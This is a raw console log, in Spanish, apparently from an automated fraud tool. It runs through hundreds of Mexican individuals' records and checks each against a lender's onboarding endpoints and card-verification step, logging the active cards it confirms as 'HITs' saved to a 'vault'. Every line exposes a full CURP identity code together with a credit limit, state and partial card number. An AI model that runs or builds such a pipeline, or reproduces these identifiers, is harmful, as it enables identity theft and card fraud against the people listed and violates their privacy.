[1782] ID:2423249 | AUAJ760729HBCCYS02 | $181,280 | BAJA CALIFOR | T:4631... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (10.9s)
[1783] ID:2488388 | LOCM720503HSOPRG00 | $181,280 | SINALOA | T:7570... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1784] ID:214626 | GANF720710HJCVJR07 | $181,250 | JALISCO | T:9464... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[1785] ID:2391638 | REPW730709HDFVRL00 | $181,250 | CIUDAD DE ME | T:6640... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[1786] ID:2453233 | AURF690113HMCNYR00 | $181,250 | ESTADO DE ME | T:7224... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.1s)
[1787] ID:3861273 | CUAM691117HYCRLN04 | $181,250 | YUCATAN | T:9877... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.2s)
[1788] ID:3936771 | NAQR770101HGRVZF00 | $181,250 | GUERRERO | T:8059... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[1789] ID:4068992 | LOGJ700525HSOPTV03 | $181,220 | SINALOA | T:8939... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1790] ID:4565265 | COCP720927HDFRRB09 | $181,200 | CIUDAD DE ME | T:2903... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[1791] ID:4484072 | AAEG720831HNLLZR09 | $181,190 | NUEVO LEON | T:7520... [🔴 OFF] Rechazo bancario (PE040) (15.3s)
[1792] ID:4406885 | POPA721101HQRTCN05 | $181,170 | QUINTANA ROO | T:9769... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.6s)
[1793] ID:4176668 | GOAV690614HYCNRC08 | $181,150 | YUCATAN | T:2252... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1794] ID:77018 | VAPH690111MMCLDR09 | $181,120 | NAUCALPAN DE | T:5942... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1795] ID:241006 | SAMM700222MMSLRR03 | $181,120 | MORELOS | T:9269... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[1796] ID:436840 | MUPJ820717HJCNRN01 | $181,120 | JALISCO | T:5719... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.6s)
[1797] ID:891691 | DOPE010101HBCMDDA6 | $181,120 | BAJA CALIFOR | T:1379... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (13.1s)
[1798] ID:2614270 | PETR691031HYCRRM01 | $181,120 | YUCATAN | T:6554... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[1799] ID:535210 | COSN710926MMNRRR02 | $181,100 | MICHOACAN | T:3722... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[1800] ID:2154370 | CERA740622HDFBMB01 | $181,100 | CIUDAD DE ME | T:3440... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1801] ID:3585199 | CIGA701001MOCSLN02 | $181,090 | OAXACA | T:9839... [🔴 OFF] Rechazo bancario (PE170) (15.4s)
[1802] ID:4543344 | SOCL700209HTSSSS07 | $181,090 | TAMAULIPAS | T:9977... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1803] ID:4750752 | CARA721030MDFRDN02 | $181,070 | CIUDAD DE ME | T:4172... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9839 para ID:3585199 ($181,090)... [1804] ID:5606 | GOMJ701214HQTNRN01 | $181,050 | QUERETARO | T:2893... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.8s)
[1805] ID:360727 | DIOA770623HDFZCR09 | $181,040 | CIUDAD DE ME | T:9823... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4172 para ID:4750752 ($181,070)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.8s)
[1806] ID:2461764 | PEBV700608HMCRNC02 | $181,040 | ESTADO DE ME | T:9975... [1807] ID:1158326 | NOGC710707HMCLMR05 | $181,020 | ESTADO DE ME | T:0680... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1808] ID:452033 | RUEA800618HPLZSL02 | $181,000 | PUEBLA | T:5031... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[1809] ID:571379 | MAPR720412HVRRLF05 | $181,000 | VERACRUZ | T:5289... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2893 para ID:5606 ($181,050)... [1810] ID:678027 | SASP701019HCSNNB09 | $181,000 | CHIAPAS | T:5440... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1811] ID:1055267 | DUOA740817HDFNCN09 | $181,000 | CIUDAD DE ME | T:7272... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1812] ID:1376519 | GAOA710301HDFRRL07 | $181,000 | CIUDAD DE ME | T:5511... [🟢 HIT #10] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[1813] ID:1560841 | SAGE740427MDFLTD04 | $181,000 | CIUDAD DE ME | T:2960... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.4s)
[1814] ID:2024032 | AARA730201HSOYDL05 | $181,000 | SONORA | T:3091... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5511 para ID:1376519 ($181,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[1815] ID:2394853 | RERL721227HDFYMS07 | $181,000 | CIUDAD DE ME | T:2096... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.4s)
[1816] ID:2440625 | GOAI740628HDFNLV07 | $181,000 | CIUDAD DE ME | T:5949... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2960 para ID:1560841 ($181,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[1817] ID:2702861 | AAPR790213MSORLC01 | $181,000 | SONORA | T:2967... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1818] ID:2925762 | ROCM720827HJCMNG03 | $181,000 | JALISCO | T:3647... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.2s)
[1819] ID:3160266 | AAGP700107MQTLRT00 | $181,000 | QUERETARO | T:6432... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1820] ID:3487656 | AERA721025HMNMZL08 | $181,000 | MICHOACAN | T:7488... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2096 para ID:2394853 ($181,000)... [🔴 OFF] Rechazo bancario (PE110) (13.8s)
[1821] ID:3635838 | OEGJ721129HDFRNN05 | $181,000 | CIUDAD DE ME | T:4099... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1822] ID:3697072 | LOGR690708HSOPRM04 | $181,000 | SONORA | T:7404... [🔴 OFF] Rechazo bancario (PE1002) (19.8s)
[1823] ID:4157037 | OILJ700702HPLLPS00 | $181,000 | PUEBLA | T:1225... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1824] ID:4191218 | SODM780808HCSBRN03 | $181,000 | TUXTLA GUTIE | T:5525... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.7s)
[1825] ID:4272876 | CARB720917HMNBMN05 | $181,000 | MICHOACAN | T:4997... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[1826] ID:4273132 | CEMD700902HCPHNT01 | $181,000 | CAMPECHE | T:2859... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1827] ID:4333986 | GAGR711214MJCRRS05 | $181,000 | JALISCO | T:2321... [🔴 OFF] Rechazo bancario (PE110) (15.0s)
[1828] ID:4349746 | GAAP690331MDFRVT04 | $181,000 | CIUDAD DE ME | T:4612... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[1829] ID:4385839 | RIRM751015HSOVDN02 | $181,000 | SONORA | T:2397... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.4s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)

[+] Lote de 500 candidatos precargados con límite >= $50,000 (1969+)
[1830] ID:45654 | VAPH690111MMCLDR09 | $180,960 | ESTADO DE ME | T:3107... [1831] ID:3567354 | GOLL720915MNLNLZ08 | $180,960 | NUEVO LEON | T:6190... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.6s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[1832] ID:3679020 | RURR000101HPLBSBA3 | $180,950 | PUEBLA | T:0415... [1833] ID:1345974 | MOVL711106HNLRLS00 | $180,900 | NUEVO LEON | T:3872... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1834] ID:1858245 | HUMM700713MYCRNR04 | $180,900 | YUCATAN | T:3301... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1835] ID:2453156 | PAPD700221MDFLRL05 | $180,900 | CIUDAD DE ME | T:2131... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1836] ID:3900181 | SUMF741018HDFRTR09 | $180,900 | CIUDAD DE ME | T:5015... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[1837] ID:182100 | CATR700503HDFSRB07 | $180,890 | CIUDAD DE ME | T:7769... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[1838] ID:3364657 | AUGJ701201HCSGRS08 | $180,870 | CHIAPAS | T:7232... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[1839] ID:4095530 | QUPF730313HBCRRR08 | $180,860 | BAJA CALIFOR | T:3776... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1840] ID:227126 | RORP700702HNLDTT02 | $180,850 | NUEVO LEON | T:2636... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[1841] ID:2650599 | PELM720302HJCLPS06 | $180,840 | JALISCO | T:2232... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7232 para ID:3364657 ($180,870)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1842] ID:3601229 | POLE690131HSORNF04 | $180,840 | SONORA | T:6756... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)
[1843] ID:4740187 | GAFG740714HCGLJL09 | $180,810 | COAHUILA | T:0955... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1844] ID:177763 | ROHE741116HDFJRD09 | $180,800 | CIUDAD DE ME | T:2973... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1845] ID:4443164 | SODA700523HVRSGL05 | $180,770 | VERACRUZ | T:2285... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2636 para ID:227126 ($180,850)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.1s)
[1846] ID:3262506 | TEGE730913MDFLNL06 | $180,750 | CIUDAD DE ME | T:0137... [🔴 OFF] Rechazo bancario (PE170) (14.1s)
[1847] ID:1008931 | GOPE770326MCGNRL09 | $180,740 | COAHUILA | T:7620... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1848] ID:4595781 | AUOS691208HMCGSS06 | $180,720 | ESTADO DE ME | T:0044... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1849] ID:984699 | CEOH760619MCMRLL09 | $180,700 | COLIMA | T:2499... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[1850] ID:4033810 | RERR740620HNLYDL01 | $180,700 | NUEVO LEON | T:2561... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2499 para ID:984699 ($180,700)... [1851] ID:4294097 | ZERA761016HNLNYR02 | $180,700 | NUEVO LEON | T:2933... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1852] ID:223002 | GAMG761006HJCRRL02 | $180,680 | JALISCO | T:2523... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.6s)
[1853] ID:4444262 | VADA750705HDFLLN06 | $180,660 | CIUDAD DE ME | T:1332... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1854] ID:4521499 | LAVA720828MMCZLL07 | $180,660 | ESTADO DE ME | T:6267... [🔴 OFF] Rechazo bancario (400) (9.4s)
[1855] ID:853206 | BOSF720912HDGNLR01 | $180,640 | DURANGO | T:4231... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1856] ID:1809532 | GUSJ691209HCHTPR00 | $180,640 | CHIHUAHUA | T:3034... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.8s)
[1857] ID:1905956 | CALM720921HBSSRR08 | $180,600 | BAJA CALIFOR | T:5098... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.4s)
[1858] ID:3217011 | NOSA720214HMCVTL00 | $180,600 | ESTADO DE ME | T:7830... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4231 para ID:853206 ($180,640)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1859] ID:4771238 | EIOE730104HGTNLD02 | $180,600 | GUANAJUATO | T:8067... [🟢 HIT #11] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.3s)
[1860] ID:1505839 | QUPA710205MQTNLD00 | $180,580 | QUERETARO | T:6438... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3034 para ID:1809532 ($180,640)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[1861] ID:3487119 | HEMJ710807MDFRRS01 | $180,560 | CIUDAD DE ME | T:8516... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[1862] ID:3148722 | LARE710212HJCSDN06 | $180,550 | JALISCO | T:1606... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)
[1863] ID:2762608 | VIFM720918HPLLRN03 | $180,530 | PUEBLA | T:6515... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8516 para ID:3487119 ($180,560)... [🔴 OFF] Contacto preexistente (/confirm-contact) (21.6s)
[1864] ID:859209 | DIMS710213HQTZRB03 | $180,510 | QUERETARO | T:7976... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (18.7s)
[1865] ID:4286379 | COGS711108MDFLRN09 | $180,490 | CIUDAD DE ME | T:7541... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6515 para ID:2762608 ($180,530)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[1866] ID:4738187 | HEMR710306HMCRNC06 | $180,480 | ESTADO DE ME | T:5225... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[1867] ID:2501839 | BANF690720HCPLVR08 | $180,450 | CAMPECHE | T:7490... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.1s)
[1868] ID:1508730 | MAMP721126MNLLLM03 | $180,430 | NUEVO LEON | T:6300... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[1869] ID:3022712 | SODA700523HVRSGL05 | $180,410 | VERACRUZ | T:6935... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[1870] ID:2813303 | LORC700402HSPPMR02 | $180,400 | SAN LUIS POT | T:9971... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1871] ID:254570 | VIDE700314MMCDVL05 | $180,380 | ESTADO DE ME | T:1483... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)
[1872] ID:3460016 | CAAL691120HMCSMS03 | $180,380 | ESTADO DE ME | T:4775... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9971 para ID:2813303 ($180,400)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (13.5s)
[1873] ID:173370 | SODE690103MMCSLL02 | $180,310 | ESTADO DE ME | T:8324... [1874] ID:3146001 | SAGC690110MJCLBL07 | $180,270 | JALISCO | T:6681... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[1875] ID:4094290 | FORA730702HNLLBL00 | $180,260 | NUEVO LEON | T:0629... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.4s)
[1876] ID:2336008 | MEAJ721121HTSDLN07 | $180,250 | TAMAULIPAS | T:7319... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6681 para ID:3146001 ($180,270)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1877] ID:775438 | DEGR710506HMCNRB00 | $180,210 | ESTADO DE ME | T:9461... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[1878] ID:1963119 | GAGR690420HDFRLC04 | $180,170 | CIUDAD DE ME | T:2764... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1879] ID:3288623 | BANF690720HCPLVR08 | $180,170 | CAMPECHE | T:3114... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0629 para ID:4094290 ($180,260)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1880] ID:3183007 | CAMC710115MGTSRN01 | $180,110 | GUANAJUATO | T:9487... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[1881] ID:1849691 | OIAR710108MVRLHC03 | $180,100 | VERACRUZ | T:7321... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (18.8s)
[1882] ID:1832062 | GAMG750329MNLRRL05 | $180,090 | NUEVO LEON | T:4763... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2764 para ID:1963119 ($180,170)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[1883] ID:3054192 | COMK830312MZSRTR09 | $180,090 | ZACATECAS | T:3661... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[1884] ID:3550056 | VAVR721002HTCSSM03 | $180,090 | TABASCO | T:6577... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.9s)
[1885] ID:4774551 | OOYG721212MMCRZD04 | $180,090 | ESTADO DE ME | T:6077... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4763 para ID:1832062 ($180,090)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[1886] ID:1531077 | PEHA741104HNLNNR09 | $180,080 | NUEVO LEON | T:1679... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1887] ID:2464942 | VELF701004HDFGPR04 | $180,070 | CIUDAD DE ME | T:5083... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.4s)
[1888] ID:766774 | SIDJ730724HNLMRS07 | $180,010 | NUEVO LEON | T:4646... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3661 para ID:3054192 ($180,090)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.2s)
[1889] ID:313485 | AUGM690913HYCGMN00 | $180,000 | YUCATAN | T:4334... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1890] ID:354669 | MACM690614MMCYHR00 | $180,000 | ESTADO DE ME | T:9782... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[1891] ID:368512 | OUMV730530MPLLRR04 | $180,000 | PUEBLA | T:3439... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1892] ID:376138 | SAGC691015MMCLLR09 | $180,000 | ESTADO DE ME | T:8136... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5083 para ID:2464942 ($180,070)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)
[1893] ID:471147 | MALR701028HVRLRL08 | $180,000 | VERACRUZ | T:7717... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[1894] ID:496614 | RAJG690822HPLMRR05 | $180,000 | PUEBLA | T:9381... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8136 para ID:376138 ($180,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[1895] ID:497559 | CAAJ700520HTCHRR07 | $180,000 | TABASCO | T:8152... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[1896] ID:515535 | PABW710202MTSLCN08 | $180,000 | VILLAHERMOSA | T:5823... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.2s)
[1897] ID:520725 | SALB731013MJCNZR07 | $180,000 | JALISCO | T:0212... [🔴 OFF] Rechazo bancario (PE170) (14.3s)
[1898] ID:538577 | MOCR691107MCHNHC09 | $180,000 | CHIHUAHUA | T:5398... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[1899] ID:556647 | FOMI730108MVRLNR04 | $180,000 | VERACRUZ | T:1654... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0212 para ID:520725 ($180,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[1900] ID:564315 | MAMF700907HMCRRR09 | $180,000 | ESTADO DE ME | T:9557... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.3s)
[1901] ID:622763 | RITA691125HNLLNL08 | $180,000 | NUEVO LEON | T:4890... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[1902] ID:633813 | GORA741217HBCMML06 | $180,000 | BAJA CALIFOR | T:8288... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.8s)
[1903] ID:657522 | PATM790228MMNRNR09 | $180,000 | MICHOACAN | T:5165... [🔴 OFF] Rechazo bancario (PE170) (15.9s)
[1904] ID:728290 | QUCV690728HCMNDC00 | $180,000 | COLIMA | T:0704... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1905] ID:751793 | CANA700224HGTHVN00 | $180,000 | GUANAJUATO | T:1607... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1906] ID:767817 | ZECV730810MCGRBR03 | $180,000 | COAHUILA | T:4128... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1907] ID:791367 | SAGM740527HMCNTR03 | $180,000 | ESTADO DE ME | T:4906... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1908] ID:868302 | SARJ690212HGTLMS06 | $180,000 | GUANAJUATO | T:2744... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1909] ID:908019 | LIBR770503HVRMRD00 | $180,000 | VERACRUZ | T:2425... [🔴 OFF] Rechazo bancario (PRO500S) (12.0s)
[1910] ID:920800 | BAAR760106MMCRLN06 | $180,000 | ESTADO DE ME | T:8620... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.3s)
[1911] ID:921941 | CAOG690510HTSBLL06 | $180,000 | TAMAULIPAS | T:2706... [🔴 OFF] Rechazo bancario (PE170) (15.3s)
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[1912] ID:949018 | JIMM720613HJCMRR06 | $180,000 | JALISCO | T:1840... [1913] ID:1025164 | DICR691007MPLZRS09 | $180,000 | PUEBLA | T:5612... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5612 para ID:1025164 ($180,000)... [1914] ID:1072887 | FEVM780101HSOLGG02 | $180,000 | SONORA | T:8320... [🔴 OFF] Rechazo bancario (PE1002) (12.4s)
[1915] ID:1095268 | MAGR740724HNLRRM04 | $180,000 | NUEVO LEON | T:0024... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[1916] ID:1131431 | MAGR740724HNLRRM04 | $180,000 | NUEVO LEON | T:1659... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.5s)
[1917] ID:1177447 | JUMF730414HBSRNL05 | $180,000 | BAJA CALIFOR | T:8349... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.4s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[1918] ID:1220005 | MUQH711107HJCNLC07 | $180,000 | JALISCO | T:7657... [1919] ID:1337429 | BARL720805MDFRML04 | $180,000 | CIUDAD DE ME | T:8000... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1920] ID:1372324 | RAMC721018HMCMRR08 | $180,000 | ESTADO DE ME | T:7161... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[1921] ID:1411247 | AAMA751028HNTMDR08 | $180,000 | NAYARIT | T:1224... [🔴 OFF] Rechazo bancario (PE1002) (13.3s)
[1922] ID:1515466 | TAEE720221MDFSXG05 | $180,000 | CIUDAD DE ME | T:5122... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[1923] ID:1517356 | VEGC720407HNLLRS02 | $180,000 | NUEVO LEON | T:0920... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.2s)
[1924] ID:1553538 | MOVA701026HCGRLL00 | $180,000 | COAHUILA | T:5858... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1925] ID:1556060 | NUVM820116HMCNLR09 | $180,000 | ESTADO DE ME | T:1773... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[1926] ID:1667904 | SACE750913MJCLRL06 | $180,000 | JALISCO | T:4005... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1927] ID:1713547 | VIOD830514HCHLRG04 | $180,000 | CHIHUAHUA | T:7831... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.1s)
[1928] ID:1718834 | RENJ760321HYCYRR03 | $180,000 | YUCATAN | T:8963... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.5s)
[1929] ID:1725882 | GUCL740702HQTSMS08 | $180,000 | QUERETARO | T:8805... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
